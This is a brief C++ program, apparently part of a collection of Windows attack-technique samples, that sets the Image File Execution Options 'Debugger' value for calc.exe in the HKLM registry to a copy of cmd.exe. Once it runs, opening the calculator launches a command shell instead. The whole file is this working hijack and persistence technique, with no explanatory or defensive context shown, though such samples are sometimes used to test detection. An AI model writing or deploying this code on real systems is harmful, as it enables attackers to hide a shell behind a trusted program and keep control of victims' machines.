#include <windows.h>
#include <string>

#include "..\..\utils.h"

using namespace std;

HKEY RootKey = HKEY_LOCAL_MACHINE;
LPCSTR SubKey = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\calc.exe";

string ExeName = "Cmd.exe";
string ExePath = string(getenv("WINDIR")) + "\\System32\\" + ExeName;

int main(){

    string binaryPath = newBinary(ExePath);

    set_registry_value(RootKey, SubKey, "Debugger", &binaryPath, NULL);

    return 0;
}